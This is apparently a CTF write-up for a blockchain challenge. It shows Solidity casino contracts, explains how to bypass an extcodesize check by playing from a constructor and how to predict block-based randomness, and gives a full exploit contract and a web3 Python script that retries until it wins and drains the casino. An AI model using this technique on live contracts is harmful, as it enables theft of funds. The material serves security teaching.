# We Go Gambling - Revenge

Category: Blockchain

Points: 421

Solves: 40

>Welcome to the Lucky Crypto Casino - Revenge!!!!! The premier destination for high-stakes gambling on the blockchain. Step right up, ladies and gentlemen, to the only place in the metaverse where fortune favors the bold!


## Solution

We are given a Setup, Casino, and Coin contract:

Setup.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Coin.sol";
import "./Casino.sol";

contract Setup {
    LuckToken public token;
    Casino public casino;

    constructor() payable {
        require(msg.value == 100 ether, "Setup requires 100 Ether");

        token = new LuckToken();
        casino = new Casino(address(token));

        uint256 luckSupply = address(this).balance / 100;

        token.mint(address(this), luckSupply);
        token.transferOwnership(address(casino));
        token.transfer(address(casino), luckSupply);
        
        payable(address(casino)).transfer(address(this).balance);
    }

    function isSolved() external view returns (bool) {
        return address(token).balance < 1 ether;
    }
}
```


Casino.sol
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Coin.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract Casino {
    LuckToken public token;
    uint256 public constant RATE = 100;

    event Won(address indexed player, uint256 amount);
    event Lost(address indexed player, uint256 amount);

    constructor(address _tokenAddress) {
        token = LuckToken(_tokenAddress);
    }

    receive() external payable {}

    function buyLuck() public payable {
        require(msg.value >= RATE, "Send at least 100 wei");
        uint256 luckAmount = msg.value / RATE;
        
        require(token.balanceOf(address(this)) >= luckAmount, "Casino has insufficient LUCK");
        token.transfer(msg.sender, luckAmount);
    }

    function sellLuck(uint256 amount) public {
        require(amount > 0, "Amount must be greater than 0");
        require(token.balanceOf(msg.sender) >= amount, "Insufficient balance");
        
        uint256 ethAmount = amount * RATE;
        require(address(this).balance >= ethAmount, "Casino has insufficient ETH liquidity");

        token.transferFrom(msg.sender, address(this), amount);

        payable(msg.sender).transfer(ethAmount);
    }

    function play(uint256 betAmount) public {
        require(msg.sender.code.length == 0, "Contracts are not allowed to play");
        require(token.balanceOf(msg.sender) >= betAmount, "Insufficient LUCK tokens");
        require(token.allowance(msg.sender, address(this)) >= betAmount, "Please approve tokens first");

        token.transferFrom(msg.sender, address(this), betAmount);

        uint256 random = uint256(keccak256(abi.encodePacked(
            block.timestamp, 
            block.prevrandao, 
            msg.sender
        ))) % 100;

        if (random < 25) {
            uint256 prize = betAmount * 4;
            require(token.balanceOf(address(this)) >= prize, "Casino cannot afford payout");
            token.transfer(msg.sender, prize);
            emit Won(msg.sender, prize);
        } else {
            emit Lost(msg.sender, betAmount);
        }
    }
}
```

Coin.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract LuckToken is ERC20, Ownable {
    constructor() ERC20("LuckToken", "LUCK") Ownable(msg.sender) {}

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
}
```


Looking at the Casino contract it seems like we can buy and sell luck but the main part of the challenge seems to concern the `play` function.

```solidity
function play(uint256 betAmount) public {
    require(msg.sender.code.length == 0, "Contracts are not allowed to play");
    require(token.balanceOf(msg.sender) >= betAmount, "Insufficient LUCK tokens");
    require(token.allowance(msg.sender, address(this)) >= betAmount, "Please approve tokens first");

    token.transferFrom(msg.sender, address(this), betAmount);

    uint256 random = uint256(keccak256(abi.encodePacked(
        block.timestamp, 
        block.prevrandao, 
        msg.sender
    ))) % 100;

    if (random < 25) {
        uint256 prize = betAmount * 4;
        require(token.balanceOf(address(this)) >= prize, "Casino cannot afford payout");
        token.transfer(msg.sender, prize);
        emit Won(msg.sender, prize);
    } else {
        emit Lost(msg.sender, betAmount);
    }
}
```

Now, at first it does some very basic checks to make sure we have to funds to play the game, then it generates a random number and then we have some probability of winning. 

Our first instinct would be to just predict the random number since we can easily see how its calculated. The only problem is that since the random number generator uses block variables like `block.timestamp` and `block.prevrandao`. These values are only available during EVM execution, so they cannot be computed directly from an EOA off-chain. To evaluate them deterministically, we would need a contract that executes on-chain in the same transaction.

However, the catch is that the first check in the `play` function is:

```solidity
require(msg.sender.code.length == 0, "Contracts are not allowed to play");
```

This check is intended to prevent contracts from calling `play`, since deployed contracts have non-zero bytecode length.

But, the key trick is that contracts only have non-zero code length after they have been fully initialized. This means we can place the game-playing logic inside the contract’s constructor. While the constructor is executing, the contract’s code has not yet been deployed on-chain, so `code.length` is still 0, allowing the check to be bypassed.


## Full Exploit Script

#### Exploit.sol:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./Casino.sol";

contract Exploit {
    constructor(address _casino) payable {
        Casino casino = Casino(payable(_casino));
        LuckToken token = casino.token();

        // 1. Buy LUCK tokens using the ETH sent to this constructor
        require(msg.value > 0, "Need ETH to buy LUCK");
        casino.buyLuck{value: msg.value}();

        uint256 betAmount = token.balanceOf(address(this));
        require(betAmount > 0, "Failed to acquire tokens");

        // 2. Predict RNG
        // Inside constructor, address(this) is the correct address
        // and extcodesize is 0, bypassing the Casino's check.
        uint256 predicted = uint256(keccak256(abi.encodePacked(
            block.timestamp, 
            block.prevrandao, 
            address(this)
        ))) % 100;
        
        // 3. Revert if we are going to lose
        require(predicted < 25, "Prediction: Lose");
        
        // 4. Approve and Play
        token.approve(address(casino), betAmount);
        casino.play(betAmount);
        
        // 5. Cash out: Send LUCK winnings back to your wallet
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
}
```


#### exploit.py:


```py
from web3 import Web3
from eth_account import Account
from solcx import compile_standard, install_solc
import json
import os

# CONFIG

RPC_URL = ...
PRIVKEY = ...
SETUP_CONTRACT_ADDR = ...
WALLET_ADDR = ...

# WEB3 SETUP

w3 = Web3(Web3.HTTPProvider(RPC_URL))
acct = Account.from_key(PRIVKEY)

print("[+] Connected to RPC:", w3.is_connected())
print("[+] Loaded attacker wallet:", acct.address)


# LOAD ABIs (used LLM to generate ABIs from contract source code)

def load_abi(filename):
    with open(filename) as f:
        return json.load(f)["abi"]

SETUP_ABI = load_abi("Setup.json")
CASINO_ABI = load_abi("Casino.json")
TOKEN_ABI = load_abi("LuckToken.json")


# COMPILE EXPLOIT CONTRACT

def compile_exploit():
    print("[*] Compiling Exploit.sol...")
    
    install_solc("0.8.20")
    
    current_dir = os.path.abspath(os.path.dirname(__file__))
    node_modules_dir = os.path.join(current_dir, "node_modules")
    
    oz_contracts = os.path.join(node_modules_dir, "@openzeppelin", "contracts")
    if not os.path.exists(oz_contracts):
        raise FileNotFoundError(f"OpenZeppelin contracts not found at {oz_contracts}. Run: npm install @openzeppelin/contracts")
    
    sources = {}
    for filename in ["Exploit.sol", "Casino.sol", "Coin.sol", "Setup.sol"]:
        with open(filename) as f:
            sources[filename] = {"content": f.read()}
    
    compiled = compile_standard(
        {
            "language": "Solidity",
            "sources": sources,
            "settings": {
                "remappings": [
                    "@openzeppelin/contracts/=node_modules/@openzeppelin/contracts/"
                ],
                "outputSelection": {"*": {"*": ["abi", "evm.bytecode"]}},
            },
        },
        solc_version="0.8.20",
        base_path=current_dir,
        allow_paths=[current_dir, node_modules_dir]
    )
    
    return (
        compiled["contracts"]["Exploit.sol"]["Exploit"]["abi"],
        compiled["contracts"]["Exploit.sol"]["Exploit"]["evm"]["bytecode"]["object"]
    )

EXPLOIT_ABI, EXPLOIT_BIN = compile_exploit()

# CONTRACT INSTANCES

setup = w3.eth.contract(address=SETUP_CONTRACT_ADDR, abi=SETUP_ABI)
casino_addr = setup.functions.casino().call()
token_addr = setup.functions.token().call()

casino = w3.eth.contract(address=casino_addr, abi=CASINO_ABI)
token = w3.eth.contract(address=token_addr, abi=TOKEN_ABI)

print("[+] Casino:", casino_addr)
print("[+] Token :", token_addr)

# TRANSACTION HELPERS

def send_tx(tx):
    """Build, sign, and send a transaction."""
    tx['nonce'] = w3.eth.get_transaction_count(acct.address)
    tx['gas'] = tx.get('gas', 300000)
    tx['maxFeePerGas'] = w3.eth.gas_price

    signed = acct.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    print("[+] Sent TX:", tx_hash.hex())

    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return receipt


# BALANCE CHECKING

def get_balances():
    """Display current balances for player and casino."""
    eth_bal = w3.from_wei(w3.eth.get_balance(acct.address), 'ether')
    luck_bal = w3.from_wei(token.functions.balanceOf(acct.address).call(), 'ether')
    casino_eth = w3.from_wei(w3.eth.get_balance(casino_addr), 'ether')
    casino_luck = w3.from_wei(token.functions.balanceOf(casino_addr).call(), 'ether')

    print("=== BALANCES ===")
    print(f"Your ETH   : {eth_bal}")
    print(f"Your LUCK  : {luck_bal}")
    print(f"Casino ETH : {casino_eth}")
    print(f"Casino LUCK: {casino_luck}")


# CASINO INTERACTIONS

def buy_luck(amount_eth):
    """Buy LUCK tokens with ETH."""
    print(f"[+] Buying LUCK with {w3.from_wei(amount_eth, 'ether')} ETH")
    tx = casino.functions.buyLuck().build_transaction({
        "from": acct.address,
        "value": amount_eth
    })
    return send_tx(tx)

def sell_luck(amount_luck):
    """Sell LUCK tokens for ETH."""
    print(f"[+] Selling {w3.from_wei(amount_luck, 'ether')} LUCK")

    # Approve first
    approve_tx = token.functions.approve(casino_addr, amount_luck).build_transaction({
        "from": acct.address,
    })
    send_tx(approve_tx)

    # Then sell
    sell_tx = casino.functions.sellLuck(amount_luck).build_transaction({
        "from": acct.address
    })
    return send_tx(sell_tx)

def play(bet_amount):
    """Play the casino game with a bet."""
    print(f"[+] Playing casino with bet: {w3.from_wei(bet_amount, 'ether')} LUCK")

    # Approve first
    approve_tx = token.functions.approve(casino_addr, bet_amount).build_transaction({
        "from": acct.address
    })
    send_tx(approve_tx)

    # Then play
    play_tx = casino.functions.play(bet_amount).build_transaction({
        "from": acct.address
    })
    return send_tx(play_tx)


# CHALLENGE CHECK


def is_solved():
    """Check if the challenge is solved."""
    solved = setup.functions.isSolved().call()
    print("[+] Challenge solved?", solved)
    return solved


# EXPLOIT UTILITIES

def calculate_contract_address(sender_address, nonce):
    """Calculate the address of a contract deployed with CREATE."""
    return w3.to_checksum_address(
        w3.keccak(
            bytes.fromhex(sender_address[2:]) + 
            bytes.fromhex(hex(nonce)[2:].zfill(2))
        )[-20:].hex()
    )

def approve_token(spender, amount):
    """Approve tokens for a spender."""
    approve_tx = token.functions.approve(spender, amount).build_transaction({
        'from': acct.address,
        'gas': 100000
    })
    return send_tx(approve_tx)


# MAIN EXPLOIT

def exploit_constructor_attack(WAGER):
    print("\n[*] Starting Constructor Attack...")
    
    # We will bet WAGER ETH worth of LUCK each time
    ETH_TO_WAGER = w3.to_wei(WAGER, 'ether') 
    
    wins = 0
    attempts = 0
    target_wins = 1

    while wins < target_wins:
        attempts += 1
        print(f"[Attempt {attempts}] ", end="")

        try:
            # Check balance before
            luck_before = token.functions.balanceOf(acct.address).call()

            # Deploy Exploit Contract
            # We send ETH_TO_WAGER directly to the constructor
            Exploit = w3.eth.contract(abi=EXPLOIT_ABI, bytecode=EXPLOIT_BIN)
            deploy_tx = Exploit.constructor(casino_addr).build_transaction({
                'from': acct.address,
                'value': ETH_TO_WAGER, 
                'gas': 500000,
                'nonce': w3.eth.get_transaction_count(acct.address)
            })
            
            signed = acct.sign_transaction(deploy_tx)
            tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

            if receipt.status == 1:
                # If status is 1, the constructor finished successfully = WE WON
                luck_after = token.functions.balanceOf(acct.address).call()
                gain = w3.from_wei(luck_after - luck_before, 'ether')
                print(f"✓ WIN! Gained {gain} LUCK")
                wins += 1
            else:
                # This usually shouldn't happen if we revert on loss, 
                # but catches other errors.
                print("✗ Transaction failed")

        except Exception as e:
            # If the contract reverts (because prediction < 25), it throws here
            if "execution reverted" in str(e) or "Prediction: Lose" in str(e):
                print("x Reverted (Predicted Loss) - Retrying...")
            else:
                print(f"Error: {str(e)[:50]}")

    print(f"\n[+] Job Done. Total Wins: {wins}")

if __name__ == "__main__":
    get_balances()
    exploit_constructor_attack(0.5) # run exploit multiple times and change wager as needed
    sell_luck(token.functions.balanceOf(acct.address).call())
    get_balances()
    is_solved()
```